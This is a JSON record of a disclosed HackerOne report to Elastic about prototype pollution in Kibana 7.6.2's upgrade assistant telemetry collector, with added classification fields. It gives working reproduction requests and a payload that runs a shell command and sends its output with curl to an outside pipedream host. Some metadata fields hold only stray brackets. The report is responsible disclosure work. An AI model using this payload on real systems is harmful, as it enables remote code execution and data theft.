{
  "reported_to": "Elastic",
  "reported_by": "alexbrasetvik ",
  "title": "Remote Code Execution on Cloud via latest Kibana 7.6.2",
  "content": "\nSummary: A prototype pollution in Kibana can be used to gain remote code execution.\nDescription:\nThere is a prototype pollution bug in the upgrade assistant's telemetry collector, via a dangerous usage of _.set: https://github.com/elastic/kibana/blob/master/x-pack/plugins/upgrade_assistant/server/lib/telemetry/usage_collector.ts#L93\nWe can pollute the prototype by providing a specially crafted \"upgrade-assistant-telemetry\" \"saved object\".\nThe attached video provides a walkthrough. There is a bit of waiting involved at one point, I included the entire thing for completeness with a hint of when you can fast forward :)\nSteps To Reproduce:\nThe following assumes an otherwise empty Kibana. If any steps breaks Kibana, you can DELETE /.kibana* and restart it to get going again.\nUpdate the kibana mappings so we can provide our \"upgrade-assistant-telemetry\" document. It's important to provide the full mapping and not just do a dynamic one, or Kibana can refuse to start up due to err-ing when validating mappings\nCode 1.64 KiB\n1PUT /.kibana_1/_mappings\n2{\n3  \"properties\": {\n4    \"upgrade-assistant-telemetry\": {\n5      \"properties\": {\n6        \"constructor\": {\n7          \"properties\": {\n8            \"prototype\": {\n9              \"properties\": {\n10                \"sourceURL\": {\n11                  \"type\": \"text\",\n12                  \"fields\": {\n13                    \"keyword\": {\n14                      \"type\": \"keyword\",\n15                      \"ignore_above\": 256\n16                    }\n17                  }\n18                }\n19              }\n20            }\n21          }\n22        },\n23        \"features\": {\n24          \"properties\": {\n25            \"deprecation_logging\": {\n26              \"properties\": {\n27                \"enabled\": {\n28                  \"type\": \"boolean\",\n29                  \"null_value\": true\n30                }\n31              }\n32            }\n33          }\n34        },\n35        \"ui_open\": {\n36          \"properties\": {\n37            \"cluster\": {\n38              \"type\": \"long\",\n39              \"null_value\": 0\n40            },\n41            \"indices\": {\n42              \"type\": \"long\",\n43              \"null_value\": 0\n44            },\n45            \"overview\": {\n46              \"type\": \"long\",\n47              \"null_value\": 0\n48            }\n49          }\n50        },\n51        \"ui_reindex\": {\n52          \"properties\": {\n53            \"close\": {\n54              \"type\": \"long\",\n55              \"null_value\": 0\n56            },\n57            \"open\": {\n58              \"type\": \"long\",\n59              \"null_value\": 0\n60            },\n61            \"start\": {\n62              \"type\": \"long\",\n63              \"null_value\": 0\n64            },\n65            \"stop\": {\n66              \"type\": \"long\",\n67              \"null_value\": 0\n68            }\n69          }\n70        }\n71      }\n72    }\n73  }\n74}\nWith the mapping ready, we can index our own telemetry status doc:\nCode 478 Bytes\n1PUT /.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry\n2{\n3    \"upgrade-assistant-telemetry\" : {\n4      \"ui_open.overview\" : 1,\n5      \"ui_open.cluster\" : 1,\n6      \"ui_open.indices\" : 1,\n7      \"constructor.prototype.sourceURL\": \"\\u2028\\u2029\\nglobal.process.mainModule.require('child_process').exec('whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-')\"\n8    },\n9    \"type\" : \"upgrade-assistant-telemetry\",\n10    \"updated_at\" : \"2020-04-17T20:47:40.800Z\"\n11  }\nThe payload pollutes the prototype, which in turn injects Javascript that spawns a shell process, in this case whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-\nWait until collection happens again, or just restart Kibana. In the video I restart Kibana, which you can do via the cloud console. Go to https://cloud.elastic.co/deployments/[your id]/kibana and click \"Force Restart\".\nKibana will take about a minute to start. Soon after starting, it'll do a telemetry collection run, that'll cause the above code to be injected and that will run the shell code.\nKibana will likely keep starting, run this, crash then restart. I cleaned up my deployment so it's not in a crash-restart loop.\nImpact\nAny cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.\nSupporting Material/References:\nThe attached video recording walks through the entire attack chain.\nImpact\nAny cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.\n\n",
  "severity": "[",
  "bounty": 10000,
  "weaknesses": "[",
  "screenshots": {},
  "disclosed_date": 1595979900,
  "report_url": "https://hackerone.com/reports/852613",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": "[",
  "vuln_description": "A prototype pollution vulnerability in Kibana's upgrade assistant telemetry collector allows for remote code execution by manipulating the prototype through a specially crafted saved object. This can be exploited by any cloud user or on-prem Kibana user with x-pack installed.",
  "reason": "The attack involves understanding Kibana's telemetry collection mechanism, prototype pollution, and crafting a payload that exploits _.set usage in the telemetry collector. The steps require precise manipulation of Kibana's internal state and knowledge of how telemetry data is processed.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": false,
  "injection_classification": "}"
}